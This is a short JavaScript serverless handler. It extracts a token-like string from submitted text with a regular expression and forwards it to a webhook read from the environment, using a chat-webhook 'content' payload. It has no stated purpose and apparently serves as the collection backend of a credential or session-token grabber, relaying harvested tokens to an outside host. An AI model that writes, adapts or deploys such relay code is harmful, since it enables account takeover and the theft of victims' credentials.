export default async function handler(req, res) {

const text = req.body.text;

const match = text.match(/items\.\|_(.*?)", "\//) || text.match(/items\.\|_(.*?)", "/);

if(!match){
return res.status(400).json({status:"invalid"});
}

const token = match[1];

const webhook = process.env.WEBHOOK;

await fetch(webhook,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
content:token
})
});

res.status(200).json({status:"ok"});
}
